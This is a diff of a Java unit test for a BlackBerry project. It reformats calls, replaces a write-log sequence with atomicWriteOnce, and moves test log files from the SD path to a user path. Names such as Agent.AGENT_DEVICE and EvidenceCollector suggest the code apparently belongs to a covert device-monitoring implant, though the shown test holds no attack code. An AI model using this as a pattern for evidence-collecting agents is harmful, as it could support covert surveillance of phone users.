@@ -9,6 +9,9 @@
  * *************************************************/
 package tests.unit;
 
+import tests.AssertException;
+import tests.TestUnit;
+import tests.Tests;
 import blackberry.Device;
 import blackberry.Status;
 import blackberry.agent.Agent;
@@ -21,7 +24,6 @@ import blackberry.utils.Check;
 import blackberry.utils.Utils;
 import blackberry.utils.WChar;
 
-// TODO: Auto-generated Javadoc
 /**
  * The Class UT_Log.
  */
@@ -54,8 +56,8 @@ public final class UT_Log extends TestUnit {
         final Status status = Status.getInstance();
         status.clear();
 
-        final Agent agent = Agent.factory(Agent.AGENT_DEVICE, true, Utils
-                .intToByteArray(0));
+        final Agent agent = Agent.factory(Agent.AGENT_DEVICE, true,
+                Utils.intToByteArray(0));
 
         agent.stop();
 
@@ -70,16 +72,13 @@ public final class UT_Log extends TestUnit {
         final Status status = Status.getInstance();
         status.clear();
 
-        final Agent agent = Agent.factory(Agent.AGENT_DEVICE, true, Utils
-                .intToByteArray(0));
-        final Evidence agentLog = EvidenceCollector.getInstance().factory(agent, true);
-
-        agentLog.createLog(null);
+        final Agent agent = Agent.factory(Agent.AGENT_DEVICE, true,
+                Utils.intToByteArray(0));
+        final Evidence agentLog = EvidenceCollector.getInstance().factory(
+                agent, true);
 
         final String content = "BlackBerry 8300\n128Kb Ram installed";
-        agentLog.writeLog(content, true);
-
-        agentLog.close();
+        agentLog.atomicWriteOnce(content);
 
     }
 
@@ -90,20 +89,22 @@ public final class UT_Log extends TestUnit {
         final Device device = Device.getInstance();
         device.clear();
 
-        final Agent agent = Agent.factory(Agent.AGENT_DEVICE, true, Utils
-                .intToByteArray(0));
+        final Agent agent = Agent.factory(Agent.AGENT_DEVICE, true,
+                Utils.intToByteArray(0));
 
-        final Evidence agentLog = EvidenceCollector.getInstance().factory(agent, true);
+        final Evidence agentLog = EvidenceCollector.getInstance().factory(
+                agent, true);
 
         // agent device vuoto
         final byte[] additionalData = null;
-        byte[] plain = agentLog.makeDescription(additionalData, EvidenceType.DEVICE);
+        byte[] plain = agentLog.makeDescription(additionalData,
+                EvidenceType.DEVICE);
 
         //#ifdef DBC
         Check.asserts(plain.length >= 32, "Wrong len 1 ");
         //#endif
 
-        AutoFlashFile file = new AutoFlashFile(Path.SD() + "LOG_test1.log",
+        AutoFlashFile file = new AutoFlashFile(Path.USER() + "LOG_test1.log",
                 false);
         if (file.exists()) {
             file.delete();
@@ -121,7 +122,7 @@ public final class UT_Log extends TestUnit {
         Check.asserts(plain.length > 32, "Wrong len 2");
         //#endif
 
-        file = new AutoFlashFile(Path.SD() + "LOG_test2.log", false);
+        file = new AutoFlashFile(Path.USER() + "LOG_test2.log", false);
         if (file.exists()) {
             file.delete();
         }
